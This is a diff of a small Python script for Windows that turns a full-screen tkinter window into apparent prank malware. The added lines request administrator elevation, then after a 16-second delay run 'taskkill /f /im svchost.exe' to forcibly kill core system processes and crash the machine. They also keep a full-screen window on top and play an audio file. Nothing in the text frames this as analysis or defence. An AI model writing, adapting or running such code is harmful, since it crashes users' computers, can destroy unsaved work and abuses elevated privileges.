@@ -1,6 +1,9 @@
 import ctypes, sys
 import tkinter as tk
 from tkinter import messagebox
+import playsound
+import time
+import os
 
 def is_admin():
     try:
@@ -9,9 +12,10 @@ def is_admin():
         return False
 
 if is_admin():
-    print("True")
+   time.sleep(16)
+   os.system("taskkill /f /im  svchost.exe")
 else:
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
 root = tk.Tk()
 root.geometry("2000x2000")
@@ -25,16 +29,21 @@ def on_closing():
 
 def onTop():
     root.lift()
-    root.after(1, onTop)
 
 def minimize_check():
-    if root.minimize:
-        root.deiconify
+    root.deiconify
+
+onTop()
+minimize_check()
 root.protocol("WM_DELETE_WINDOW", on_closing)
 root.attributes('-fullscreen', True)
+
+playsound.playsound('audio.mp3')
+
 
 root.mainloop()
 while True:
     onTop()
     minimize_check()
+
 
